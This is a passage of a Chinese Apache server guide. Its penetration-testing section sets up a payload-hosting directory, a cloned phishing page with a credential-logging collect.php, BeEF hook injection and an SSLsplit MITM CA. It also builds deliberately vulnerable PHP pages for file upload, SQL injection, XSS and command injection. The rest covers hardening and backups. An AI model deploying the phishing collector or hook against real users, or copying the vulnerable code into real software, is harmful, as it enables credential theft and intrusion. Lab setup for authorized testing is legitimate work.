```bash
# 创建payload目录
sudo mkdir -p /var/www/html/payloads/{shells,exploits,tools}

# 设置适当权限
sudo chown -R www-data:www-data /var/www/html/payloads
sudo chmod -R 755 /var/www/html/payloads

# 创建简单的文件列表页面
cat << 'EOF' | sudo tee /var/www/html/payloads/index.php
<?php
$dir = '.';
$files = scandir($dir);
echo "<h2>Available Payloads</h2><ul>";
foreach($files as $file) {
    if($file != '.' && $file != '..') {
        echo "<li><a href='$file'>$file</a></li>";
    }
}
echo "</ul>";
?>
EOF

# 快速启动临时HTTP服务器（Python方式）
cd /tmp/payloads
python3 -m http.server 8000

# 或使用PHP内置服务器
php -S 0.0.0.0:8000
```

### 4. 搭建钓鱼页面测试环境
```bash
# ⚠️ 仅限授权测试使用！

# 创建钓鱼页面目录
sudo mkdir -p /var/www/html/phishing-test

# 克隆目标网站（使用HTTrack）
sudo apt install httrack -y
httrack "https://example.com" -O /tmp/clone

# 复制到Web目录
sudo cp -r /tmp/clone/* /var/www/html/phishing-test/

# 修改表单action指向你的收集脚本
# 创建简单的日志收集脚本
cat << 'EOF' | sudo tee /var/www/html/phishing-test/collect.php
<?php
// ⚠️ 仅用于授权测试
$data = json_encode($_POST);
file_put_contents('/tmp/phishing-log.txt', $data . PHP_EOL, FILE_APPEND);
header('Location: https://example.com');
exit;
?>
EOF

# 配置虚拟主机
sudo nano /etc/apache2/sites-available/phishing-test.conf
```

### 5. 搭建BeEF（Browser Exploitation Framework）
```bash
# 安装依赖
sudo apt install ruby-full git -y

# 克隆BeEF
cd /opt
sudo git clone https://github.com/beefproject/beef.git
cd beef

# 安装Gem依赖
sudo gem install bundler
sudo bundle install

# 配置BeEF
sudo nano config.yaml
# 修改密码等配置

# 启动BeEF
./beef

# 在目标页面中注入hook脚本
# <script src="http://[your-ip]:3000/hook.js"></script>
```

### 6. 配置SSL中间人测试环境
```bash
# 安装SSLsplit
sudo apt install sslsplit -y

# 生成CA证书
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 365 -key ca.key -out ca.crt

# 配置Apache作为前端代理
# 用于测试SSL剥离攻击等
```

### 7. 文件上传漏洞测试环境
```bash
# 创建上传目录
sudo mkdir -p /var/www/html/upload-test/uploads
sudo chmod 777 /var/www/html/upload-test/uploads

# 创建简单的上传页面
cat << 'EOF' | sudo tee /var/www/html/upload-test/index.php
<!DOCTYPE html>
<html>
<head><title>File Upload Test</title></head>
<body>
<h2>Upload File</h2>
<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
</body>
</html>
EOF

# 创建有漏洞的上传处理脚本（仅用于测试）
cat << 'EOF' | sudo tee /var/www/html/upload-test/upload.php
<?php
// ⚠️ 故意设计的有漏洞代码，仅用于测试
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);

if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    echo "File uploaded: " . $target_file;
} else {
    echo "Upload failed!";
}
?>
EOF
```

### 8. SQL注入测试环境
```bash
# 创建测试数据库
sudo mysql -u root -p
```

```sql
CREATE DATABASE sqli_test;
USE sqli_test;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50),
    email VARCHAR(100)
);

INSERT INTO users VALUES 
(1, 'admin', 'admin123', 'admin@test.com'),
(2, 'user', 'user123', 'user@test.com');

CREATE USER 'testuser'@'localhost' IDENTIFIED BY 'testpass';
GRANT ALL PRIVILEGES ON sqli_test.* TO 'testuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

```bash
# 创建有漏洞的PHP页面
cat << 'EOF' | sudo tee /var/www/html/sqli-test.php
<?php
// ⚠️ 故意设计的有漏洞代码
$conn = new mysqli("localhost", "testuser", "testpass", "sqli_test");

if(isset($_GET['id'])) {
    $id = $_GET['id'];
    $sql = "SELECT * FROM users WHERE id = $id";  // 有SQL注入漏洞
    $result = $conn->query($sql);
    
    while($row = $result->fetch_assoc()) {
        echo "ID: " . $row['id'] . " - Name: " . $row['username'] . "<br>";
    }
}
?>
<form method="GET">
    User ID: <input type="text" name="id">
    <input type="submit" value="Search">
</form>
EOF
```

### 9. XSS测试环境
```bash
# 创建XSS测试页面
cat << 'EOF' | sudo tee /var/www/html/xss-test.php
<?php
// ⚠️ 故意设计的有漏洞代码
if(isset($_GET['name'])) {
    echo "Hello, " . $_GET['name'] . "!";  // 反射型XSS漏洞
}
?>
<form method="GET">
    Name: <input type="text" name="name">
    <input type="submit" value="Submit">
</form>
EOF
```

### 10. 命令注入测试环境
```bash
# 创建命令注入测试页面
cat << 'EOF' | sudo tee /var/www/html/cmd-test.php
<?php
// ⚠️ 故意设计的有漏洞代码
if(isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $output = shell_exec("ping -c 4 " . $ip);  // 命令注入漏洞
    echo "<pre>$output</pre>";
}
?>
<form method="GET">
    IP Address: <input type="text" name="ip">
    <input type="submit" value="Ping">
</form>
EOF
```

## 十一、高级配置

### 1. 配置反向代理负载均衡
```bash
sudo a2enmod proxy proxy_http proxy_balancer lbmethod_byrequests
```

```apache
<VirtualHost *:80>
    ServerName loadbalancer.local
    
    <Proxy balancer://mycluster>
        BalancerMember http://backend1:8080 route=1
        BalancerMember http://backend2:8080 route=2
        BalancerMember http://backend3:8080 route=3
        
        ProxySet lbmethod=byrequests
        ProxySet stickysession=ROUTEID
    </Proxy>
    
    ProxyPass / balancer://mycluster/
    ProxyPassReverse / balancer://mycluster/
    
    # 负载均衡器管理页面
    <Location /balancer-manager>
        SetHandler balancer-manager
        Require local
    </Location>
</VirtualHost>
```

### 2. WebSocket代理配置
```bash
sudo a2enmod proxy_wstunnel
```

```apache
<VirtualHost *:80>
    ServerName ws.example.com
    
    # WebSocket代理
    ProxyPass /ws ws://localhost:3000/ws
    ProxyPassReverse /ws ws://localhost:3000/ws
    
    # 常规HTTP
    ProxyPass / http://localhost:3000/
    ProxyPassReverse / http://localhost:3000/
</VirtualHost>
```

### 3. 配置IP地理位置阻止
```bash
# 安装GeoIP模块
sudo apt install libapache2-mod-geoip geoip-database -y
sudo a2enmod geoip
```

```apache
<IfModule mod_geoip.c>
    GeoIPEnable On
    GeoIPDBFile /usr/share/GeoIP/GeoIP.dat
    
    # 阻止特定国家
    SetEnvIf GEOIP_COUNTRY_CODE CN BlockCountry
    SetEnvIf GEOIP_COUNTRY_CODE RU BlockCountry
    
    <Location />
        <RequireAll>
            Require all granted
            Require not env BlockCountry
        </RequireAll>
    </Location>
</IfModule>
```

### 4. 配置ModSecurity WAF
```bash
# 安装ModSecurity
sudo apt install libapache2-mod-security2 -y

# 复制推荐配置
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf

# 编辑配置
sudo nano /etc/modsecurity/modsecurity.conf
# 修改: SecRuleEngine On

# 下载OWASP核心规则集
cd /tmp
wget https://github.com/coreruleset/coreruleset/archive/refs/heads/main.zip
unzip main.zip
sudo mv coreruleset-main /etc/modsecurity/crs
sudo cp /etc/modsecurity/crs/crs-setup.conf.example /etc/modsecurity/crs/crs-setup.conf

# 启用规则
sudo nano /etc/apache2/mods-enabled/security2.conf
```

```apache
<IfModule security2_module>
    SecDataDir /var/cache/modsecurity
    IncludeOptional /etc/modsecurity/*.conf
    IncludeOptional /etc/modsecurity/crs/crs-setup.conf
    IncludeOptional /etc/modsecurity/crs/rules/*.conf
</IfModule>
```

```bash
sudo systemctl restart apache2
```

### 5. 配置访问频率限制
```bash
sudo a2enmod ratelimit evasive
```

```apache
# 使用mod_evasive
<IfModule mod_evasive20.c>
    DOSHashTableSize 3097
    DOSPageCount 2
    DOSSiteCount 50
    DOSPageInterval 1
    DOSSiteInterval 1
    DOSBlockingPeriod 10
    DOSEmailNotify admin@example.com
    DOSLogDir /var/log/apache2/evasive
</IfModule>
```

### 6. 配置自定义错误页面
```bash
# 创建自定义错误页面目录
sudo mkdir -p /var/www/errors

# 创建404页面
cat << 'EOF' | sudo tee /var/www/errors/404.html
<!DOCTYPE html>
<html>
<head>
    <title>404 - Page Not Found</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        h1 { font-size: 50px; }
    </style>
</head>
<body>
    <h1>404</h1>
    <p>The page you're looking for doesn't exist.</p>
    <a href="/">Go Home</a>
</body>
</html>
EOF
```

```apache
# 在虚拟主机配置中添加
ErrorDocument 400 /errors/400.html
ErrorDocument 401 /errors/401.html
ErrorDocument 403 /errors/403.html
ErrorDocument 404 /errors/404.html
ErrorDocument 500 /errors/500.html

Alias /errors /var/www/errors
```

## 十二、安全加固清单

### 生产环境安全检查表

```bash
# 1. 更新系统和Apache
sudo apt update && sudo apt upgrade -y

# 2. 最小化安装（仅安装需要的模块）
apache2ctl -M  # 检查已启用模块
sudo a2dismod status autoindex  # 禁用不需要的模块

# 3. 隐藏版本信息
# ServerTokens Prod
# ServerSignature Off

# 4. 禁用目录浏览
# Options -Indexes

# 5. 限制HTTP方法
# <LimitExcept GET POST>
#     Require all denied
# </LimitExcept>

# 6. 配置SSL/TLS
# 使用强加密套件和TLS 1.2+

# 7. 实施访问控制
# 使用IP白名单、认证等

# 8. 配置防火墙
sudo ufw enable
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# 9. 定期备份配置
sudo tar -czf apache-config-$(date +%Y%m%d).tar.gz /etc/apache2/

# 10. 监控日志
# 设置日志监控和告警

# 11. 使用ModSecurity
# 安装并配置WAF

# 12. 限制上传文件大小
# LimitRequestBody 10485760

# 13. 配置适当的文件权限
sudo find /var/www -type f -exec chmod 644 {} \;
sudo find /var/www -type d -exec chmod 755 {} \;

# 14. 禁用不安全的PHP函数
# disable_functions = exec,passthru,shell_exec...

# 15. 定期安全审计
```

## 十三、备份与恢复

### 备份脚本
```bash
#!/bin/bash
# Apache完整备份脚本

BACKUP_DIR="/backup/apache"
DATE=$(date +%Y%m%d-%H%M%S)
BACKUP_FILE="apache-backup-$DATE.tar.gz"

# 创建备份目录
mkdir -p $BACKUP_DIR

# 备份配置文件
echo "Backing up Apache configuration..."
sudo tar -czf $BACKUP_DIR/config-$DATE.tar.gz /etc/apache2/

# 备份网站文件
echo "Backing up web files..."
sudo tar -czf $BACKUP_DIR/www-$DATE.tar.gz /var/www/

# 备份日志（可选）
echo "Backing up logs..."
sudo tar -czf $BACKUP_DIR/logs-$DATE.tar.gz /var/log/apache2/

# 创建完整备份
sudo tar -czf $BACKUP_DIR/$BACKUP_FILE \
    /etc/apache2/ \
    /var/www/ \
    /etc/ssl/

# 删除30天前的备份
find $BACKUP_DIR -name "*.tar.gz" -mtime +30 -delete

echo "Backup completed: $BACKUP_DIR/$BACKUP_FILE"